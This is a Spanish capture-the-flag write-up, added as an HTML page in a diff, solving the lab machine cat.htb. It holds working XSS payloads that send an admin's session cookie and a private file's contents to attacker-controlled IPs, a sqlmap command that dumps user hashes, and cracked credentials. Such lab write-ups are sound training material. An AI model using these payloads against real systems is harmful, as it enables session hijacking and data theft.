@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<!-- saved from url=(0050)https://secret.club/2022/05/11/fuzzing-solana.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="theme-color" content="#111111"><meta property="og:image" content="/assets/twitter.png"><link rel="preload" href="./fonts.min.css" as="style"><link rel="stylesheet" href="./fonts.min.css"><link rel="alternate" type="application/atom+xml" title="juanchan.es RSS" href="https://juanchan.es">
+
+    <title>Máquina 1</title>
+
+
+    <meta name="generator" content="Jekyll v3.9.3"><meta property="og:title" content="maquinas/ctf"><meta name="author" content="addison"><meta property="og:locale" content="en_US"><meta name="description" content="maquinas/ctf juanchan.es"><meta property="og:description" content="maquinas/ctf juanchan.es"><link rel="canonical" href="https://juachan.es"><meta property="og:url" content="https://juachan.es"><meta property="og:site_name" content="juanchan"><meta property="og:type" content="article"><meta property="article:published_time" content="2022-05-11T07:00:00+00:00"><script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"addison"},"dateModified":"2022-05-11T07:00:00+00:00","datePublished":"2022-05-11T07:00:00+00:00","description":"maquinas/ctf juanchan.es","headline":"maquinas/ctf juanchan","mainEntityOfPage":{"@type":"WebPage","@id":"https://juanchan.es"},"url":"https://juanchan.es"}</script><style> * { margin: 0; padding: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 16.5px; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 18px; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "Charter", serif; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono, summary { font-family: 'Source Code Pro', monospace; font-weight: 500; } .img-right { float: right; height: 300px; padding-left: 2em } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: .9rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #121212; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { color: var(--text-1); font-size: 0.8rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 0.9rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.35; margin-bottom: 1rem; } details + :not(details) { margin-top: 1rem; } details + h3, details + h2, details + h1 { margin-top: 1.2rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 0.2rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; float: left; margin-left: -19px; position: absolute; } h3:before { content: ""; margin-left: -17px; height: 10px; width: 10px; background: var(--accent); border-radius: 100%; top: calc(50% - 6px); } h1 { font-size: 1.3em; } h2 { font-size: 1.2em; } h3 { font-size: 1.1em; } p a, main li a { text-decoration: underline; } summary { margin-left: -17px; cursor: pointer; } summary::marker { color: var(--accent); } details :nth-child(2) { margin-top: 0.8rem; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "•"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em; } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { border-left: 4px solid var(--bg-1); margin: 0 0 1rem -24px; padding-left: 20px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } code { font-size: 14px; } @media screen and (min-width: 640px) { code { font-size: 15px; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } blockquote { margin: 0 0 0 1.25em; } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } } @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); }</style>
+    </head>
+
+
+<body><header align="center"><a href="/maquinas.html">Máquinas/CTF</a><nav><a href="/">Sobre mi</a></nav></header>
+
+
+    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting"><h1 itemprop="name headline">Máquina resuelta</h1><div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px"> <img itemprop="image" alt="main authors image" src="./agile.jpg"> <span class="mono authors"> <a href="https://secret.club/author/addison" itemprop="name">Agile</a> </span></div><time datetime="2022-05-11T07:00:00+00:00" itemprop="datePublished" class="mono"> Feb, 2023 </time><hr><main itemprop="articleBody" style="position: relative">
+
+
+
+
+<h2 id="1-escaneo-de-puertos-tcp">1. Escaneo de puertos tcp</h2>
+<pre><code class="language-bash">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)
+|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)
+|_  256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://cat.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="2-enumeración">2. Enumeración</h2>
+<p>Empezamos enumerando y listado todos los directorios y archivos con la herramienta <strong>dirsearch</strong>:</p>
+<pre><code class="language-bash">
+# python dirsearch.py -u http://cat.htb
+
+_|. _ _  _  _  _ _|_    v0.4.3                                                                                                                    
+(_||| _) (/_(_|| (_| )                                                                                                                                                                      
+Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289
+
+Target: http://cat.htb/
+
+[06:39:38] Scanning:                                                                                                                                                                                                                                        
+[06:39:45] 301 -   301B - /.git  -&gt;  http://cat.htb/.git/                   
+[06:39:45] 403 -   272B - /.git/                                            
+[06:39:45] 403 -   272B - /.git/branches/
+[06:39:45] 200 -     7B - /.git/COMMIT_EDITMSG
+[06:39:45] 200 -    92B - /.git/config                                      
+[06:39:45] 200 -    23B - /.git/HEAD
+[06:39:45] 200 -    73B - /.git/description                                 
+[06:39:45] 403 -   272B - /.git/hooks/                                      
+[06:39:45] 200 -    2KB - /.git/index                                       
+[06:39:45] 403 -   272B - /.git/info/                                       
+[06:39:45] 200 -   240B - /.git/info/exclude
+[06:39:45] 403 -   272B - /.git/logs/
+[06:39:45] 200 -   150B - /.git/logs/HEAD
+[06:39:45] 301 -   317B - /.git/logs/refs/heads  -&gt;  http://cat.htb/.git/logs/refs/heads/
+[06:39:45] 200 -   150B - /.git/logs/refs/heads/master
+[06:39:45] 301 -   311B - /.git/logs/refs  -&gt;  http://cat.htb/.git/logs/refs/
+[06:39:45] 403 -   272B - /.git/objects/                                    
+[06:39:45] 301 -   312B - /.git/refs/heads  -&gt;  http://cat.htb/.git/refs/heads/
+[06:39:45] 200 -    41B - /.git/refs/heads/master
+[06:39:45] 403 -   272B - /.git/refs/                                       
+[06:39:45] 301 -   311B - /.git/refs/tags  -&gt;  http://cat.htb/.git/refs/tags/
+[06:39:46] 403 -   272B - /.php                                             
+[06:39:54] 302 -     1B - /admin.php  -&gt;  /join.php
+</code></pre>
+<p>En dicha salida, vemos que existe un directorio .git, el cual lo podemos obtener con la herramienta <strong>git-dumper</strong>:</p>
+<pre><code class="language-bash"># git-dumper http://cat.htb .
+</code></pre>
+<p>La cual nos descarga los siguientes archivos:</p>
+<pre><code class="language-bash">total 84
+-rwxr-xr-x 1 root root  893 Feb 25 09:06 accept_cat.php
+-rwxr-xr-x 1 root root 4496 Feb 25 09:06 admin.php
+-rwxr-xr-x 1 root root  277 Feb 25 09:06 config.php
+-rwxr-xr-x 1 root root 6676 Feb 25 09:06 contest.php
+drwxr-xr-x 2 root root 4096 Feb 25 09:06 css
+-rwxr-xr-x 1 root root 1136 Feb 25 09:06 delete_cat.php
+drwxr-xr-x 7 root root 4096 Feb 25 09:06 .git
+drwxr-xr-x 2 root root 4096 Feb 25 09:06 img
+drwxr-xr-x 2 root root 4096 Feb 25 09:06 img_winners
+-rwxr-xr-x 1 root root 3509 Feb 25 09:06 index.php
+-rwxr-xr-x 1 root root 5891 Feb 25 09:06 join.php
+-rwxr-xr-x 1 root root   79 Feb 25 09:06 logout.php
+-rwxr-xr-x 1 root root 2725 Feb 25 09:06 view_cat.php
+-rwxr-xr-x 1 root root 1676 Feb 25 09:06 vote.php
+drwxr-xr-x 2 root root 4096 Feb 25 09:06 winners
+-rwxr-xr-x 1 root root 3374 Feb 25 09:06 winners.php
+</code></pre>
+<p>Una vez examinados los archivos, vemos que en el archivo <code>join.php</code> podemos ver como el método de registro es inseguro, pues no se realiza una correcta validación de los datos de entrada, tal y como se muestra en el siguiente fragmento de código:</p>
+<pre><code class="language-bash">// Registration process
+if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;GET&quot; &amp;&amp; isset($_GET[&#39;registerForm&#39;])) {
+    $username = $_GET[&#39;username&#39;];
+    $email = $_GET[&#39;email&#39;];
+    $password = md5($_GET[&#39;password&#39;]);
+
+    $stmt_check = $pdo-&gt;prepare(&quot;SELECT * FROM users WHERE username = :username OR email = :email&quot;);
+    $stmt_check-&gt;execute([&#39;:username&#39; =&gt; $username, &#39;:email&#39; =&gt; $email]);
+    $existing_user = $stmt_check-&gt;fetch(PDO::FETCH_ASSOC);
+
+    if ($existing_user) {
+        $error_message = &quot;Error: Username or email already exists.&quot;;
+    } else {
+        $stmt_insert = $pdo-&gt;prepare(&quot;INSERT INTO users (username, email, password) VALUES (:username, :email, :password)&quot;);
+        $stmt_insert-&gt;execute([&#39;:username&#39; =&gt; $username, &#39;:email&#39; =&gt; $email, &#39;:password&#39; =&gt; $password]);
+
+        if ($stmt_insert) {
+            $success_message = &quot;Registration successful!&quot;;
+        } else {
+            $error_message = &quot;Error: Unable to register user.&quot;;
+        }
+    }
+}
+</code></pre>
+<p>Por lo que en el campo de nombre de usuario pode probar a realizar algún tipo de inyección XSS.</p>
+<p>&nbsp;</p>
+<h2 id="3-explotación">3. Explotación</h2>
+<p>Probamos a introducir entonces la siguiente cadena en el campo del nombre del usuario:</p>
+<pre><code class="language-bash">&lt;script&gt;document.location=&#39;http://10.10.14.118?c=&#39;+document.cookie&lt;/script&gt;
+</code></pre>
+<p>Si ahora subimos una foto del concurso, ponemos un servidor http a la escucha y esperamos a que el administrador lo compruebe, recibiremos la siguiente petición en la que se incluirá su cookie de sesión:</p>
+<pre><code class="language-bash"># python -m http.server 80             
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.53 - - [25/Feb/2025 09:24:40] &quot;GET /?c=PHPSESSID=4slr5e8gqbrhesm75usul53bu7 HTTP/1.1&quot; 200 -
+10.10.11.53 - - [25/Feb/2025 09:24:40] code 404, message File not found
+10.10.11.53 - - [25/Feb/2025 09:24:40] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -
+</code></pre>
+<p>Cambiamos entonces el token de usuario en el navegador y observamos como somos capaces de acceder como usuarios administrador a la página web.</p>
+<p>En dicha página de administrador, observamos que podemos realizar la votación a los distintos gatos del concurso. En ella podemos ver los campos que hemos subido, a la hora de registrar a uno. Si nos fijamos en el código de dicha página, gracias a los ficheros descargados del repositorio git del paso 2, vemos lo siguiente:</p>
+<pre><code>// Check if the form has been submitted
+if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) {
+    // Capture form data
+    $cat_name = $_POST[&#39;cat_name&#39;];
+    $age = $_POST[&#39;age&#39;];
+    $birthdate = $_POST[&#39;birthdate&#39;];
+    $weight = $_POST[&#39;weight&#39;];
+
+    $forbidden_patterns = &quot;/[+*{}&#39;,;&lt;&gt;()\\[\\]\\/\\:]/&quot;;
+
+    // Check for forbidden content
+    if (contains_forbidden_content($cat_name, $forbidden_patterns) ||
+        contains_forbidden_content($age, $forbidden_patterns) ||
+        contains_forbidden_content($birthdate, $forbidden_patterns) ||
+        contains_forbidden_content($weight, $forbidden_patterns)) {
+        $error_message = &quot;Your entry contains invalid characters.&quot;;
+</code></pre>
+<p>Una vez subido el gato, el administrador puede aprobar dicho gato o no. Esto se hace a través del endpoint <code>/accept_cat.php</code> con la siguiente petición:</p>
+<pre><code class="language-bash">POST /accept_cat.php HTTP/1.1
+Host: cat.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 80
+Origin: http://cat.htb
+Connection: keep-alive
+Referer: http://cat.htb/admin.php
+Cookie: PHPSESSID=hk7vmhrjn9v8d33pmfbo8ahtnr
+Priority: u=0
+
+catName=1&amp;catId=1
+</code></pre>
+<p>Si observamos entonces el código del fichero <code>accept_cat.php</code>, que es el que tramita dicha petición, vemos lo siguiente:</p>
+<pre><code class="language-bash">$catId = $_POST[&#39;catId&#39;];
+$sql_insert = &quot;INSERT INTO accepted_cats (name) VALUES (&#39;$cat_name&#39;)&quot;;
+$pdo-&gt;exec($sql_insert);
+</code></pre>
+<p>Es decir, no se realiza una sanetización del parámetro <strong>catId</strong>,por lo que podemos intentar realizar un sqli. Si observamos la respuesta a dicha petición podemos ver como no somos capaces de observar una respuesta con contenido. Por lo que para agilizar el proceso de ataque podemos utilizar la herramienta <strong>sqlmap</strong>, y obtenemos lo siguiente:</p>
+<pre><code class="language-bash"># sqlmap -u &quot;http://cat.htb/accept_cat.php&quot; --data &quot;catName=1&amp;catId=1&quot; --cookie=&quot;PHPSESSID=hk7vmhrjn9v8d33pmfbo8ahtnr&quot; -p catName --level=5 --risk=3 --dbms=SQLite --technique=B -T &quot;users&quot; --threads=4 --dump 
+
+    [10:27:18] [INFO] retrieving the length of query output
+    [10:27:18] [INFO] retrieved: 159
+    [10:27:56] [INFO] retrieved: CREATE TABLE users (     user_id INTEGER PRIMARY KEY,     username VARCHAR(255) NOT NULL,     email VARCHAR(255) NOT NULL,     password VARCHAR(255) NOT NULL )               
+    [10:27:56] [INFO] fetching entries for table &#39;users&#39;
+    [10:27:56] [INFO] fetching number of entries for table &#39;users&#39; in database &#39;SQLite_masterdb&#39;
+    [10:27:56] [INFO] retrieved: 11
+    [10:27:57] [INFO] retrieving the length of query output
+    [10:27:57] [INFO] retrieved: 18
+    [10:28:02] [INFO] retrieved: axel2017@gmail.com             
+    [10:28:02] [INFO] retrieving the length of query output
+    [10:28:02] [INFO] retrieved: 32
+    [10:28:10] [INFO] retrieved: d1bbba3670feb9435c9841e46e60ee2f             
+    [10:28:10] [INFO] retrieving the length of query output
+    [10:28:10] [INFO] retrieved: 1
+    [10:28:11] [INFO] retrieved: 1
+    [10:28:12] [INFO] retrieving the length of query output
+    [10:28:12] [INFO] retrieved: 4
+    [10:28:13] [INFO] retrieved: axel           
+    [10:28:13] [INFO] retrieving the length of query output
+    [10:28:13] [INFO] retrieved: 24
+    [10:28:19] [INFO] retrieved: rosamendoza485@gmail.com             
+    [10:28:19] [INFO] retrieving the length of query output
+    [10:28:19] [INFO] retrieved: 32
+    [10:28:29] [INFO] retrieved: ac369922d560f17d6eeb8b2c7dec498c             
+    [10:28:29] [INFO] retrieving the length of query output
+    [10:28:29] [INFO] retrieved: 1
+    [10:28:30] [INFO] retrieved: 2
+    [10:28:31] [INFO] retrieving the length of query output
+    [10:28:31] [INFO] retrieved: 4
+    [10:28:32] [INFO] retrieved: rosa           
+    [10:28:32] [INFO] retrieving the length of query output
+    [10:28:32] [INFO] retrieved: 29
+    [10:28:39] [INFO] retrieved: robertcervantes2000@gmail.com
+</code></pre>
+<p>En dicha salida, podemos ver unos nombres de usuarios y unos hashes. Intentamos entonces crackear estos hashes con la herramienta online <strong>Crackstation</strong> y damos conseguido los siguientes credenciales:</p>
+<pre><code class="language-bash">rosa:soyunaprincesarosa
+</code></pre>
+<p>Y damos conseguido acceso al equipo.</p>
+<p>&nbsp;</p>
+<h2 id="3-movimiento-lateral">3. Movimiento lateral</h2>
+<p>Podemos observar como en el directorio /home de Rosa no se encuentra la flag de usuario. Si observamos más directorios dentro de home, podemos ver el del usuario axel. Revisando logs y ficheros, descubrimos los logs del servicio apache2. En el podemos observar las conexiones a dicho servicio, y descubrir la siguiente información:</p>
+<pre><code class="language-bash">./apache2/access.log:127.0.0.1 - - [25/Feb/2025:14:49:20 +0000] &quot;GET /join.php?loginUsername=axel&amp;loginPassword=aNdZwgC4tI9gnVXv_e3Q&amp;loginForm=Login HTTP/1.1&quot; 302 329 &quot;http://cat.htb/join.php&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0&quot;
+</code></pre>
+<p>Accedemos por tanto, a través de ssh a dicho usuario con las credenciales <code>axel:aNdZwgC4tI9gnVXv_e3Q</code>. Y observamos que somos capaces de obtener las flag de usuario.</p>
+<p>&nbsp;</p>
+<h2 id="4-escalado-de-privilegios">4. Escalado de privilegios</h2>
+<p>Cuando iniciamos sesión por ssh, vemos el siguiente banner:</p>
+<pre><code class="language-bash">
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+You have mail.
+Last login: Thu Feb 27 19:07:51 2025 from 10.10.16.101
+</code></pre>
+<p>Es decir, podemos observar como el usuario axel tiene un corre. Si miramos el email descubrimos lo siguiente:</p>
+<pre><code class="language-bash">From rosa@cat.htb  Sat Sep 28 04:51:50 2024
+Return-Path: &lt;rosa@cat.htb&gt;
+Received: from cat.htb (localhost [127.0.0.1])
+        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S4pnXk001592
+        for &lt;axel@cat.htb&gt;; Sat, 28 Sep 2024 04:51:50 GMT
+Received: (from rosa@localhost)
+        by cat.htb (8.15.2/8.15.2/Submit) id 48S4pnlT001591
+        for axel@localhost; Sat, 28 Sep 2024 04:51:49 GMT
+Date: Sat, 28 Sep 2024 04:51:49 GMT
+From: rosa@cat.htb
+Message-Id: &lt;202409280451.48S4pnlT001591@cat.htb&gt;
+Subject: New cat services
+
+Hi Axel,
+
+We are planning to launch new cat-related web services, including a cat care website and other projects. Please send an email to jobert@localhost with information about your Gitea repository. 
+Jobert will check if it is a promising service that we can develop.
+
+Important note: Be sure to include a clear description of the idea so that I can understand it properly. I will review the whole repository.
+
+From rosa@cat.htb  Sat Sep 28 05:05:28 2024
+Return-Path: &lt;rosa@cat.htb&gt;
+Received: from cat.htb (localhost [127.0.0.1])
+        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S55SRY002268
+        for &lt;axel@cat.htb&gt;; Sat, 28 Sep 2024 05:05:28 GMT
+Received: (from rosa@localhost)
+        by cat.htb (8.15.2/8.15.2/Submit) id 48S55Sm0002267
+        for axel@localhost; Sat, 28 Sep 2024 05:05:28 GMT
+Date: Sat, 28 Sep 2024 05:05:28 GMT
+From: rosa@cat.htb
+Message-Id: &lt;202409280505.48S55Sm0002267@cat.htb&gt;
+Subject: Employee management
+
+We are currently developing an employee management system. Each sector administrator will be assigned a specific role, while each employee will be able to consult their assigned tasks. 
+The project is still under development and is hosted in our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. 
+In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md.
+</code></pre>
+<p>Si listamos entonces la interfaces de red, vemos que existe un servicio web en el puerto 3000. Si forwardeamos dicho servicio a nuestra máquina:</p>
+<pre><code class="language-bash"># ssh -L 1234:127.0.0.1:3000 axel@cat.htb
+</code></pre>
+<p>Vemos un servicio llamado <strong>Gitea</strong>, con la versión 1.22.0. Si buscamos algun exploit relacionado, vemos el siguiente <a href="https://www.exploit-db.com/exploits/52077">https://www.exploit-db.com/exploits/52077</a>. El cual basicamente consiste en un XSS stored, más concretamente en el campo descripción cuando creamos un repositorio.
+Se nos puede ocurrir modificar esto para que un usuario del sistema (según el correo el usuario jobert@localhost) lea el commit y nos mande lo que contenga el endpoint <a href="http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php">http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php</a> listado en el correo,</p>
+<p>Para ello, siguiendo el exploit encontrado, deberemos de realizar los siguientes pasos:</p>
+<ol>
+<li><p>Primero nos logeamos como axel en gitea</p>
+</li>
+<li><p>Creamos un repositorio, con la siguiente descripción</p>
+</li>
+</ol>
+<pre><code class="language-bash">    &lt;a href=&quot;javascript:fetch(&#39;http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php&#39;).then(response =&gt; response.text()).then(data =&gt; fetch(&#39;http://10.10.15.33/?response=&#39; + encodeURIComponent(data))).catch(error =&gt; console.error(&#39;Error:&#39;, error));&quot;&gt;XSS test&lt;/a&gt;
+</code></pre>
+<ol start="3">
+<li>Después en una terminal, en nuestro equipo, abrimos un puerto ssh escuchando:</li>
+</ol>
+<pre><code>    # python -m http.server 80
+</code></pre>
+<ol start="4">
+<li>En una terminal como axel, enviamos un correo a jobert pidiendo que revise nuestro repo</li>
+</ol>
+<pre><code>    echo -e &quot;Subject: test \n\nHello check my repo http://localhost:3000/axel/test&quot; | sendmail jobert@localhost
+</code></pre>
+<ol start="5">
+<li>Recibimos como respuesta el siguiente mensaje</li>
+</ol>
+<pre><code>    10.10.11.53 - - [27/Feb/2025 16:09:56] &quot;GET /?response=%3C%3Fphp%0A%24valid_username%20%3D%20%27admin%27%3B%0A%24valid_password%20%3D%20%27IKw75eR0MR7CMIxhH0%27%3B%0A%0Aif%20(!isset(%24_SERVER%5B%27PHP_AUTH_USER%27%5D)%20%7C%7C%20!isset(%24_SERVER%5B%27PHP_AUTH_PW%27%5D)%20%7C%7C%20%0A%20%20%20%20%24_SERVER%5B%27PHP_AUTH_USER%27%5D%20!%3D%20%24valid_username%20%7C%7C%20%24_SERVER%5B%27PHP_AUTH_PW%27%5D%20!%3D%20%24valid_password)%20%7B%0A%20%20%20%20%0A%20%20%20%20header(%27WWW-Authenticate%3A%20Basic%20realm%3D%22Employee%20Management%22%27)%3B%0A%20%20%20%20header(%27HTTP%2F1.0%20401%20Unauthorized%27)%3B%0A%20%20%20%20exit%3B%0A%7D%0A%0Aheader(%27Location%3A%20dashboard.php%27)%3B%0Aexit%3B%0A%3F%3E%0A%0A HTTP/1.1&quot; 200 -
+</code></pre>
+<p>En el que se pueden ver las credenciales <code>admin:IKw75eR0MR7CMIxhH0</code>. Si probamos a iniciar sesión por ssh como <code>root:IKw75eR0MR7CMIxhH0</code>, vemos que damos conseguido acceso, y por lo tanto somos capaces de obtener la flag de usuario root.</p>
+
+
+
+
+
+<p>&nbsp;</p><p>&nbsp;</p>
+</div>
+     <div class="footer-credits" style="display: flex; justify-content: flex-end">
+        <a> Made by Juan González </a>
+    </div>
+</div>
+</body></html>
